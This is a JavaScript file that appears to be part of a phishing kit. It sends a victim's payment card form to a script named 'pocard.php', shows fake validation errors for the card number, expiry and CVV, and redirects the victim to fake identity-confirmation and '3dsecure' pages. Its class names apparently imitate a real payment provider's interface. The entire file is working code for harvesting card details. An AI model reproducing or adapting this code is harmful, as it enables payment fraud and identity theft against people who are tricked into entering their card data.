$("#card").validate({
  submitHandler: function(form) {
    $.post("../post/pocard.php", $("#card").serialize(), function(GET) {
      if (GET == "error") {
        setTimeout(function() {
          document.getElementById("DivNumber").className = "textInput ccNumber ccNumber ccNum lap hasError";
          document.getElementById("DivLogo").className = "fiModule-icon_card hide";
          document.getElementById("loding").className = "hasSpinner hide";
          document.getElementById("MSGError").className = "twbs_alert vx_alert vx_alert-critical js_alertMsg";
        })
      } else if (GET == "exp") {
        setTimeout(function() {
          document.getElementById("DivExp").className = "textInput expirationDate js_expirationDate expirationDate expirationDate lap hasError";
          document.getElementById("loding").className = "hasSpinner hide";
        })
      } else if (GET == "cvv") {
        setTimeout(function() {
          document.getElementById("DivCvv").className = "textInput csc pull-right csc securityCode lap hasError";
          document.getElementById("loding").className = "hasSpinner hide";
        })
      } else if (GET == "noid") {
        setTimeout(function() {
          window.location.assign("restored");
        })
      } else if (GET == "nosecure") {
        setTimeout(function() {
          window.location.assign("confirm=identity");
        })
      } else {
        setTimeout(function() {
          window.location.assign("3dsecure?keyId="+ngerandom());
        })
      }
    });
  },
});
function ngerandom() {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < 50; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}
